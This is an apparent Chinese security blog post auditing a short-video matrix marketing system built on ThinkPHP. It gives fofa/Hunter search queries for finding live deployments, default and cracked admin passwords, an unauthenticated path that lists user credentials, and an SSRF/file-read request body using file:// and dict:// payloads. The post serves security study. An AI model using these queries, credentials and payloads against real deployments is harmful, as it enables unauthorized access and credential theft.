@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>我的技术与生活——某音矩阵云混剪系统V2.3.0代码审计(1) | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——某音矩阵云混剪系统V2.3.0代码审计(1)`
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="http://example.com/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://example.com/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://example.com/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="http://example.com/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"免杀开发基础(1)","path":"2024/04/12/免杀开发基础-1/"},{"title":"Hexo的使用","path":"2024/04/03/Hexo的使用/"},{"title":"如何从小程序到教务系统","path":"2024/04/09/如何从小程序到教务系统/"},{"title":"某小学AK,SK泄露导致横向到云主机控制台","path":"2024/04/16/某小学AK-SK泄露导致横向到云主机控制台/"},{"title":"小白如何挖到自己的第一个漏洞","path":"2024/04/07/小白如何挖到自己的第一个漏洞/"},{"title":"某音矩阵云混剪系统V2.3.0代码审计(1)","path":"2024/04/25/某音矩阵云混剪系统V2-3-0代码审计-1/"},{"title":"网安开发实战(1)-Cdn","path":"2024/04/16/网安开发实战-1-Cdn/"},{"title":"记第一次eudsrc拿到RCE(上)","path":"2024/04/05/记第一次edusrc拿到RCE-上/"},{"title":"记第一次eudsrc拿到RCE(下)","path":"2024/04/06/记第一次eudsrc拿到RCE-下/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">小鱼</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">渗透测试</span>
+          <span class="main-left--tag">善于观察</span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“花有重开日，人无再少年”</p>
+        <p>“一个简单普通的男孩”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a target="_blank" rel="noopener" href="https://gitee.com/ccshyi"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>5</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>6</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>1 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>9 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>24天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <link rel="stylesheet" href="/css/partial/article.css" />
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">某音矩阵云混剪系统V2.3.0代码审计(1)</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            <a class="category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/">代码审计实战</a>
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            <a class="tag-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
+          </div>
+          
+          <p class="article-info--date">日期：2024-04-25 22:28:56</p>
+        </div>
+        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本篇文章是自己学习代码审计后,进行代码审计的第一篇记录,目前此源码中仍有很多漏洞,这里就只写出几个比较容易常见的漏洞来做以介绍</span><br></pre></td></tr></table></figure>
+
+<p>​																           <strong>免责声明</strong></p>
+<p>文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本博客站不承担任何法律及连带责任！！!</p>
+<h2 id="系统介绍"><a href="#系统介绍" class="headerlink" title="系统介绍:"></a>系统介绍:</h2><p>系统为<strong>ThinkPHP框架</strong>,源码的<strong>目录结构 控制器全都是简单的eval加密:</strong></p>
+<p><img src="/%E6%9F%90%E9%9F%B3%E7%9F%A9%E9%98%B5%E4%BA%91%E6%B7%B7%E5%89%AA%E7%B3%BB%E7%BB%9FV2-3-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/image-20240425222055103.png" alt="image-20240425222055103"></p>
+<p><img src="/%E6%9F%90%E9%9F%B3%E7%9F%A9%E9%98%B5%E4%BA%91%E6%B7%B7%E5%89%AA%E7%B3%BB%E7%BB%9FV2-3-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/image-20240425200741044.png" alt="image-20240425200741044"></p>
+<h2 id="资产信息收集"><a href="#资产信息收集" class="headerlink" title="资产信息收集"></a>资产信息收集</h2><h3 id="fofa"><a href="#fofa" class="headerlink" title="fofa:"></a>fofa:</h3><p>title&#x3D;”短视频矩阵营销系统”</p>
+<p><img src="/%E6%9F%90%E9%9F%B3%E7%9F%A9%E9%98%B5%E4%BA%91%E6%B7%B7%E5%89%AA%E7%B3%BB%E7%BB%9FV2-3-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20240425144926.png" alt="微信截图_20240425144926"></p>
+<h3 id="鹰图"><a href="#鹰图" class="headerlink" title="鹰图:"></a>鹰图:</h3><p>web.title&#x3D;”短视频矩阵营销系统”</p>
+<p><img src="/%E6%9F%90%E9%9F%B3%E7%9F%A9%E9%98%B5%E4%BA%91%E6%B7%B7%E5%89%AA%E7%B3%BB%E7%BB%9FV2-3-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20240425144714.png" alt="微信截图_20240425144714"></p>
+<h2 id="资产样式"><a href="#资产样式" class="headerlink" title="资产样式:"></a>资产样式:</h2><h3 id="登录页面"><a href="#登录页面" class="headerlink" title="登录页面:"></a>登录页面:</h3><p><img src="/%E6%9F%90%E9%9F%B3%E7%9F%A9%E9%98%B5%E4%BA%91%E6%B7%B7%E5%89%AA%E7%B3%BB%E7%BB%9FV2-3-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/image-20240425141818798.png" alt="image-20240425141818798"></p>
+<h3 id="后台界面"><a href="#后台界面" class="headerlink" title="后台界面:"></a>后台界面:</h3><p><img src="/%E6%9F%90%E9%9F%B3%E7%9F%A9%E9%98%B5%E4%BA%91%E6%B7%B7%E5%89%AA%E7%B3%BB%E7%BB%9FV2-3-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20240425200213.png" alt="微信截图_20240425200213"></p>
+<h3 id="数据大屏"><a href="#数据大屏" class="headerlink" title="数据大屏:"></a>数据大屏:</h3><p><img src="/%E6%9F%90%E9%9F%B3%E7%9F%A9%E9%98%B5%E4%BA%91%E6%B7%B7%E5%89%AA%E7%B3%BB%E7%BB%9FV2-3-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/image-20240425144318710.png" alt="image-20240425144318710"></p>
+<h2 id="漏洞1"><a href="#漏洞1" class="headerlink" title="漏洞1:"></a>漏洞1:</h2><h3 id="弱口令漏洞"><a href="#弱口令漏洞" class="headerlink" title="弱口令漏洞"></a>弱口令漏洞</h3><p>这个是通过google语法收集的默认账号密码,通过搜集的资产进行验证,很多资产可以登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin/123456</span><br><span class="line"></span><br><span class="line">ceshi/123456</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞2"><a href="#漏洞2" class="headerlink" title="漏洞2:"></a>漏洞2:</h2><h3 id="可道云后⻔-管理员等账号密码信息泄露"><a href="#可道云后⻔-管理员等账号密码信息泄露" class="headerlink" title="可道云后⻔+管理员等账号密码信息泄露"></a>可道云后⻔+管理员等账号密码信息泄露</h3><p>在\public\static\admin\css\kod\data\system\system_member.php存在账号密码信息泄露</p>
+<p>密码为常见的MD5加密</p>
+<p><img src="/%E6%9F%90%E9%9F%B3%E7%9F%A9%E9%98%B5%E4%BA%91%E6%B7%B7%E5%89%AA%E7%B3%BB%E7%BB%9FV2-3-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/image-20240425195355050.png" alt="image-20240425195355050"></p>
+<p><img src="/%E6%9F%90%E9%9F%B3%E7%9F%A9%E9%98%B5%E4%BA%91%E6%B7%B7%E5%89%AA%E7%B3%BB%E7%BB%9FV2-3-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/image-20240425195123604.png" alt="image-20240425195123604"></p>
+<p>MD5解密</p>
+<table>
+<thead>
+<tr>
+<th>账号</th>
+<th>密码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>admin</td>
+<td>a123456</td>
+</tr>
+<tr>
+<td>demo</td>
+<td>demo</td>
+</tr>
+<tr>
+<td>guest</td>
+<td>guest</td>
+</tr>
+</tbody></table>
+<p>拼接进入页面,输入账号密码即可进入</p>
+<p>&#x2F;static&#x2F;admin&#x2F;css&#x2F;kod&#x2F;index.php</p>
+<p><img src="/%E6%9F%90%E9%9F%B3%E7%9F%A9%E9%98%B5%E4%BA%91%E6%B7%B7%E5%89%AA%E7%B3%BB%E7%BB%9FV2-3-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/image-20240425205454606.png" alt="image-20240425205454606"></p>
+<p>​	进入后,这里我在bing搜索了可道云,发现可道云存在很多历史漏洞,这里就先放着了,因为我的目的是进行代码审计,而不是进行利用.</p>
+<p><img src="/%E6%9F%90%E9%9F%B3%E7%9F%A9%E9%98%B5%E4%BA%91%E6%B7%B7%E5%89%AA%E7%B3%BB%E7%BB%9FV2-3-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/image-20240425205809777.png" alt="image-20240425205809777"></p>
+<h2 id="前台未授权操纵漏洞"><a href="#前台未授权操纵漏洞" class="headerlink" title="前台未授权操纵漏洞:"></a>前台未授权操纵漏洞:</h2><p>在 &#x2F;application&#x2F;admin&#x2F;controller&#x2F;user.php 控制器中的index⽅法直接GET获取page，然后查询数据</p>
+<p>表并直接将账号密码列出，并且未加鉴权函数</p>
+<p>payload:</p>
+<p>直接访问 &#x2F;index.php&#x2F;admin&#x2F;user&#x2F;index.html?page&#x3D;1 即可未授权查看⽤户账密信息</p>
+<p><img src="/%E6%9F%90%E9%9F%B3%E7%9F%A9%E9%98%B5%E4%BA%91%E6%B7%B7%E5%89%AA%E7%B3%BB%E7%BB%9FV2-3-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/image-20240425221453478.png" alt="image-20240425221453478"></p>
+<h3 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞:"></a>变量覆盖漏洞:</h3><h4 id="漏洞路径处"><a href="#漏洞路径处" class="headerlink" title="漏洞路径处:"></a>漏洞路径处:</h4><p>&#x2F;com&#x2F;Auth.php</p>
+<p>漏洞存在原因:parse_str函数中存在变量,存在变量覆盖漏洞</p>
+<h4 id="漏洞出现处"><a href="#漏洞出现处" class="headerlink" title="漏洞出现处:"></a>漏洞出现处:</h4><p>parse_str($query,$param); &#x2F;&#x2F;解析规则中的param</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ( <span class="variable">$authList</span> <span class="keyword">as</span> <span class="variable">$auth</span> ) &#123;</span><br><span class="line">           <span class="variable">$query</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^.+\?/U&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$auth</span>);</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$mode</span>==<span class="string">&#x27;url&#x27;</span> &amp;&amp; <span class="variable">$query</span>!=<span class="variable">$auth</span> ) &#123;</span><br><span class="line">               <span class="title function_ invoke__">parse_str</span>(<span class="variable">$query</span>,<span class="variable">$param</span>); <span class="comment">//解析规则中的param</span></span><br><span class="line">               <span class="variable">$intersect</span> = <span class="title function_ invoke__">array_intersect_assoc</span>(<span class="variable">$REQUEST</span>,<span class="variable">$param</span>);</span><br><span class="line">               <span class="variable">$auth</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\?.*$/U&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$auth</span>);</span><br><span class="line">               <span class="keyword">if</span> ( <span class="title function_ invoke__">in_array</span>(<span class="variable">$auth</span>,<span class="variable">$name</span>) &amp;&amp; <span class="variable">$intersect</span>==<span class="variable">$param</span> ) &#123;  <span class="comment">//如果节点相符且url参数满足</span></span><br><span class="line">                   <span class="variable">$list</span>[] = <span class="variable">$auth</span> ;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$auth</span> , <span class="variable">$name</span>))&#123;</span><br><span class="line">               <span class="variable">$list</span>[] = <span class="variable">$auth</span> ;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; </span><br></pre></td></tr></table></figure>
+
+<p>​	存在变量覆盖漏洞。在循环中，<code>$auth</code> 变量被重复使用，导致后面的赋值操作会覆盖前面的值。</p>
+<h3 id="任意文件读取和SSRF漏洞"><a href="#任意文件读取和SSRF漏洞" class="headerlink" title="任意文件读取和SSRF漏洞:"></a>任意文件读取和SSRF漏洞:</h3><p><strong>在 &#x2F;application&#x2F;admin&#x2F;controller&#x2F;userinfo.php 控制器中的poihuoqu方法，存在curl_exec函数，传参可控，未加鉴权，且结果直接回显，导致任意文件读取和SSRF漏洞.</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">poihuoqu</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line"><span class="variable">$poi</span> =  <span class="title function_ invoke__">input</span>(<span class="string">&#x27;post.poi&#x27;</span>);    </span><br><span class="line"><span class="variable">$url</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$poi</span>);    </span><br><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">curl_init</span>();    </span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$info</span>,CURLOPT_RETURNTRANSFER,<span class="literal">true</span>);    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$info</span>,CURLOPT_HEADER,<span class="number">0</span>);    </span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$info</span>,CURLOPT_NOBODY,<span class="number">0</span>);    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$info</span>,CURLOPT_SSL_VERIFYPEER,<span class="literal">false</span>);    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$info</span>,CURLOPT_SSL_VERIFYPEER,<span class="literal">false</span>);    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$info</span>,CURLOPT_SSL_VERIFYHOST,<span class="literal">false</span>);    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$info</span>,CURLOPT_URL,<span class="variable">$url</span>);    </span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$info</span>);    </span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$info</span>);    <span class="comment">//$id = stripos($output,&quot;poi_id=&quot;);    </span></span><br><span class="line"><span class="variable">$on</span> = <span class="title function_ invoke__">mb_stripos</span>(<span class="variable">$output</span>,<span class="string">&quot;poi_id=&quot;</span>);    </span><br><span class="line"><span class="variable">$er</span> = <span class="title function_ invoke__">mb_stripos</span>(<span class="variable">$output</span>,<span class="string">&quot;&amp;&quot;</span>);    </span><br><span class="line"><span class="variable">$poiid</span> = <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$output</span>,<span class="variable">$on</span>+<span class="number">7</span>,<span class="variable">$er</span>-<span class="variable">$on</span>-<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$output</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="variable">$poiid</span>]);    </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;        </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span>=&gt;-<span class="number">1</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="string">&#x27;获取失败&#x27;</span>]);    </span><br><span class="line">        &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>请求包:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php/admin/Userinfo/poihuoqu HTTP/<span class="number">2</span></span><br><span class="line">Host: </span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Sec-Ch-Ua: <span class="string">&quot;(Not(A:Brand&quot;</span>;v=<span class="string">&quot;8&quot;</span>, <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;101&quot;</span></span><br><span class="line">Sec-Ch-Ua-Mobile: ?<span class="number">0</span></span><br><span class="line">Sec-Ch-Ua-Platform: <span class="string">&quot;Windows&quot;</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">101.0</span>.<span class="number">4951.54</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: none</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-User: ?1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Content-Length: 22</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">poi=file:///C:/Windows/win.ini  任意文件读取</span></span><br><span class="line"><span class="comment">poi=dict://ip:16383  ssrf查看内网rides</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​	本篇文章是自己学习代码审计后,第一次审计代码,仅做记录和学习使用,如果存在解读不到位的地方,还请各位师傅能给我一些建议,谢谢!</p>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2024/04/25/某音矩阵云混剪系统V2-3-0代码审计-1/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">系统介绍:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E4%BA%A7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">资产信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fofa"><span class="toc-number">3.1.</span> <span class="toc-text">fofa:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%B9%B0%E5%9B%BE"><span class="toc-number">3.2.</span> <span class="toc-text">鹰图:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E4%BA%A7%E6%A0%B7%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">资产样式:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2"><span class="toc-number">4.1.</span> <span class="toc-text">登录页面:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E7%95%8C%E9%9D%A2"><span class="toc-number">4.2.</span> <span class="toc-text">后台界面:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 